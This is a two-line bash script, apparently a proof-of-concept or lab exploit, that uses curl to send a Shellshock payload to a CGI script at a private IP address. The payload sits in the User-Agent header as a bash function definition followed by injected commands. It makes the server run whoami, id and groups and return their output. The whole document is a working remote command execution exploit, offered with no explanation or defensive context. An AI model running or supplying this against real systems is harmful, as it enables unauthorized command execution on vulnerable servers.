#!/bin/bash
curl -k -H 'User-Agent: () { :;}; /bin/bash -c "echo \"Content-type: text/html\r\n\r\n\"; echo \"\"; whoami; id; groups;"' 192.168.55.216/cgi-bin/ss.cgi
